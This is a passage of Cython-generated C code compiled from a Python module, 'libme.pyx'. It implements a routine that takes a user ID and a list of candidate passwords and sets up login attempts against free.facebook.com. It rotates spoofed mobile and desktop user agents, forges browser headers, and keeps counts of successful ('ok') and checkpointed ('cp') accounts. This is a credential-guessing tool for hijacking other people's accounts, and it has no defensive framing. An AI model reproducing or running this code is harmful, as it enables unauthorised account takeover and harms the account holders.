  PyObject *__pyx_v_ses = NULL;
  PyObject *__pyx_v_p = NULL;
  PyObject *__pyx_v_b = NULL;
  PyObject *__pyx_v_bl = NULL;
  PyObject *__pyx_v_i = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_gaaa = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_kuki = NULL;
  PyObject *__pyx_v_key = NULL;
  PyObject *__pyx_v_value = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  Py_ssize_t __pyx_t_5;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *(*__pyx_t_9)(PyObject *);
  int __pyx_t_10;
  PyObject *__pyx_t_11 = NULL;
  Py_ssize_t __pyx_t_12;
  PyObject *(*__pyx_t_13)(PyObject *);
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  int __pyx_t_17;
  int __pyx_t_18;
  PyObject *(*__pyx_t_19)(PyObject *);
  int __pyx_t_20;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__f_james__", 0);

  /* "libme.pyx":1028
 * 						coeg.submit(self.__f_james__, uid, pwx)
 * 	def __f_james__(self, uid, pwx):
 * 		ua = random.choice([             # <<<<<<<<<<<<<<
 * 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 * 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_random); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 1028, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1028, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyList_New(9); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 1028, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_kp_s_Dalvik_1_6_0_Linux_U_Android_4_4);
  __Pyx_GIVEREF(__pyx_kp_s_Dalvik_1_6_0_Linux_U_Android_4_4);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_kp_s_Dalvik_1_6_0_Linux_U_Android_4_4);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Linux_Android_10_Mi);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Linux_Android_10_Mi);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_kp_s_Mozilla_5_0_Linux_Android_10_Mi);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_WOW64);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_WOW64);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_WOW64);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_2);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_2);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_2);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_Win64);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_Win64);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_kp_s_Mozilla_5_0_Windows_NT_6_1_Win64);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_IoT_10_0_And);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_IoT_10_0_And);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_kp_s_Mozilla_5_0_Windows_IoT_10_0_And);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_3);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_3);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_3);
  __Pyx_INCREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_4);
  __Pyx_GIVEREF(__pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_4);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_kp_s_Mozilla_5_0_Windows_NT_10_0_Win6_4);
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_4, __pyx_t_2) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1028, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_v_ua = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "libme.pyx":1040
 * 			'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
 * 		])
 * 		host = 'https://free.facebook.com'             # <<<<<<<<<<<<<<
 * 		sys.stdout.write(
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 */
  __Pyx_INCREF(__pyx_kp_s_https_free_facebook_com);
  __pyx_v_host = __pyx_kp_s_https_free_facebook_com;

  /* "libme.pyx":1041
 * 		])
 * 		host = 'https://free.facebook.com'
 * 		sys.stdout.write(             # <<<<<<<<<<<<<<
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 * 		); sys.stdout.flush()
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_sys); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1041, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_stdout); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 1041, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_write); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1041, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "libme.pyx":1042
 * 		host = 'https://free.facebook.com'
 * 		sys.stdout.write(
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))             # <<<<<<<<<<<<<<
 * 		); sys.stdout.flush()
 * 		for pw in pwx:
 */
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_loop); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 1042, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1042, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = PyObject_Length(__pyx_t_4); if (unlikely(__pyx_t_5 == ((Py_ssize_t)-1))) __PYX_ERR(0, 1042, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = PyInt_FromSsize_t(__pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1042, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_ok); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1042, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_5 = PyObject_Length(__pyx_t_6); if (unlikely(__pyx_t_5 == ((Py_ssize_t)-1))) __PYX_ERR(0, 1042, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = PyInt_FromSsize_t(__pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1042, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_cp); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1042, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_5 = PyObject_Length(__pyx_t_7); if (unlikely(__pyx_t_5 == ((Py_ssize_t)-1))) __PYX_ERR(0, 1042, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = PyInt_FromSsize_t(__pyx_t_5); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1042, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_8 = PyTuple_New(4); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 1042, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_4);
  PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_t_4);
  __Pyx_GIVEREF(__pyx_t_6);
  PyTuple_SET_ITEM(__pyx_t_8, 2, __pyx_t_6);
  __Pyx_GIVEREF(__pyx_t_7);
  PyTuple_SET_ITEM(__pyx_t_8, 3, __pyx_t_7);
  __pyx_t_2 = 0;
  __pyx_t_4 = 0;
  __pyx_t_6 = 0;
  __pyx_t_7 = 0;
  __pyx_t_7 = __Pyx_PyString_Format(__pyx_kp_s_s_s_ok_s_cp_s, __pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1042, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_8 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_8)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_8);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_8, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1041, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":1043
 * 		sys.stdout.write(
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 * 		); sys.stdout.flush()             # <<<<<<<<<<<<<<
 * 		for pw in pwx:
 * 			kwargs = {}
 */
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_sys); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1043, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_stdout); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1043, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_flush); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1043, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_7 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_7)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_7);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1043, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":1044
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 * 		); sys.stdout.flush()
 * 		for pw in pwx:             # <<<<<<<<<<<<<<
 * 			kwargs = {}
 * 			pw = pw.lower()
 */
  if (likely(PyList_CheckExact(__pyx_v_pwx)) || PyTuple_CheckExact(__pyx_v_pwx)) {
    __pyx_t_1 = __pyx_v_pwx; __Pyx_INCREF(__pyx_t_1); __pyx_t_5 = 0;
    __pyx_t_9 = NULL;
  } else {
    __pyx_t_5 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_v_pwx); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1044, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_9 = Py_TYPE(__pyx_t_1)->tp_iternext; if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 1044, __pyx_L1_error)
  }
  for (;;) {
    if (likely(!__pyx_t_9)) {
      if (likely(PyList_CheckExact(__pyx_t_1))) {
        if (__pyx_t_5 >= PyList_GET_SIZE(__pyx_t_1)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_3 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_5); __Pyx_INCREF(__pyx_t_3); __pyx_t_5++; if (unlikely(0 < 0)) __PYX_ERR(0, 1044, __pyx_L1_error)
        #else
        __pyx_t_3 = PySequence_ITEM(__pyx_t_1, __pyx_t_5); __pyx_t_5++; if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1044, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
        #endif
      } else {
        if (__pyx_t_5 >= PyTuple_GET_SIZE(__pyx_t_1)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_3 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_5); __Pyx_INCREF(__pyx_t_3); __pyx_t_5++; if (unlikely(0 < 0)) __PYX_ERR(0, 1044, __pyx_L1_error)
        #else
        __pyx_t_3 = PySequence_ITEM(__pyx_t_1, __pyx_t_5); __pyx_t_5++; if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1044, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
        #endif
      }
    } else {
      __pyx_t_3 = __pyx_t_9(__pyx_t_1);
      if (unlikely(!__pyx_t_3)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 1044, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_3);
    }
    __Pyx_XDECREF_SET(__pyx_v_pw, __pyx_t_3);
    __pyx_t_3 = 0;

    /* "libme.pyx":1045
 * 		); sys.stdout.flush()
 * 		for pw in pwx:
 * 			kwargs = {}             # <<<<<<<<<<<<<<
 * 			pw = pw.lower()
 * 			ses = requests.Session()
 */
    __pyx_t_3 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1045, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_XDECREF_SET(__pyx_v_kwargs, ((PyObject*)__pyx_t_3));
    __pyx_t_3 = 0;

    /* "libme.pyx":1046
 * 		for pw in pwx:
 * 			kwargs = {}
 * 			pw = pw.lower()             # <<<<<<<<<<<<<<
 * 			ses = requests.Session()
 * 			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
 */
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_pw, __pyx_n_s_lower); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1046, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_8 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
      __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_7);
      if (likely(__pyx_t_8)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
        __Pyx_INCREF(__pyx_t_8);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_7, function);
      }
    }
    __pyx_t_3 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1046, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_DECREF_SET(__pyx_v_pw, __pyx_t_3);
    __pyx_t_3 = 0;

    /* "libme.pyx":1047
 * 			kwargs = {}
 * 			pw = pw.lower()
 * 			ses = requests.Session()             # <<<<<<<<<<<<<<
 * 			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
 * 			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
 */
    __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_requests); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1047, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_Session); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 1047, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_8);
      if (likely(__pyx_t_7)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
        __Pyx_INCREF(__pyx_t_7);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_8, function);
      }
    }
    __pyx_t_3 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1047, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_XDECREF_SET(__pyx_v_ses, __pyx_t_3);
    __pyx_t_3 = 0;

    /* "libme.pyx":1048
 * 			pw = pw.lower()
 * 			ses = requests.Session()
 * 			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})             # <<<<<<<<<<<<<<
 * 			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
 * 			b = parser(p,"html.parser")
 */
    __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_ses, __pyx_n_s_headers); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 1048, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_update); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 1048, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_8 = __Pyx_PyDict_NewPresized(10); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 1048, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_origin, __pyx_v_host) < 0) __PYX_ERR(0, 1048, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_8, __pyx_kp_s_accept_language, __pyx_kp_s_id_ID_id_q_0_9_en_US_q_0_8_en_q) < 0) __PYX_ERR(0, 1048, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_8, __pyx_kp_s_accept_encoding, __pyx_kp_s_gzip_deflate) < 0) __PYX_ERR(0, 1048, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_accept, __pyx_kp_s_text_html_application_xhtml_xml) < 0) __PYX_ERR(0, 1048, __pyx_L1_error)
    if (PyDict_SetItem(__pyx_t_8, __pyx_kp_s_user_agent, __pyx_v_ua) < 0) __PYX_ERR(0, 1048, __pyx_L1_error)
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_bs4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1048, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_re); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 1048, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_findall); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1048, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = NULL;
    __pyx_t_10 = 0;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
      __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_4);
      if (likely(__pyx_t_2)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
        __Pyx_INCREF(__pyx_t_2);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_4, function);
        __pyx_t_10 = 1;
      }
    }
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(__pyx_t_4)) {
      PyObject *__pyx_temp[3] = {__pyx_t_2, __pyx_kp_s__55, __pyx_v_host};
      __pyx_t_6 = __Pyx_PyFunction_FastCall(__pyx_t_4, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1048, __pyx_L1_error)
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_GOTREF(__pyx_t_6);
    } else
    #endif
    #if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(__pyx_t_4)) {
      PyObject *__pyx_temp[3] = {__pyx_t_2, __pyx_kp_s__55, __pyx_v_host};
      __pyx_t_6 = __Pyx_PyCFunction_FastCall(__pyx_t_4, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1048, __pyx_L1_error)
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_GOTREF(__pyx_t_6);
    } else
    #endif
    {
      __pyx_t_11 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 1048, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_11);
      if (__pyx_t_2) {
        __Pyx_GIVEREF(__pyx_t_2); PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_t_2); __pyx_t_2 = NULL;
      }
      __Pyx_INCREF(__pyx_kp_s__55);
      __Pyx_GIVEREF(__pyx_kp_s__55);
      PyTuple_SET_ITEM(__pyx_t_11, 0+__pyx_t_10, __pyx_kp_s__55);
      __Pyx_INCREF(__pyx_v_host);
      __Pyx_GIVEREF(__pyx_v_host);
      PyTuple_SET_ITEM(__pyx_t_11, 1+__pyx_t_10, __pyx_v_host);
      __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_t_11, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 1048, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
    }
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = __Pyx_PyString_Join(__pyx_kp_s_, __pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1048, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_Host, __pyx_t_4) < 0) __PYX_ERR(0, 1048, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = PyNumber_Add(__pyx_v_host, __pyx_kp_s_login_next_ref_dbl_fl_refid_8); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 1048, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_referer, __pyx_t_4) < 0) __PYX_ERR(0, 1048, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
